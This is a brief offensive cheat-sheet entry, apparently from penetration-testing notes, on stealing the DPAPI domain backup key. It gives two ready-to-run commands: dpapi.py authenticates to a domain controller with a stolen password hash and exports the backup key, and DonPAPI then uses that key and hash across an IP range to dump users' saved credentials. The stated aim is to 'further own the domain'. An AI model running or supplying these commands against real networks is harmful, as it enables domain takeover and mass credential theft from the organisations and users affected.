# DPAPI Backup Keys dumping

## Tools: dpapi.py , DonPAPI

    dpapi.py backupkeys -hashes':HASH' -t Administrator@DC_IP --export

### Then

    DonPAPI -pvk DOMAIN_BACKUP_KEY.PVK -H':HASH' DOMAIN/USER@IP_RANGE

### With this technique, we dump credentials to further own the domain
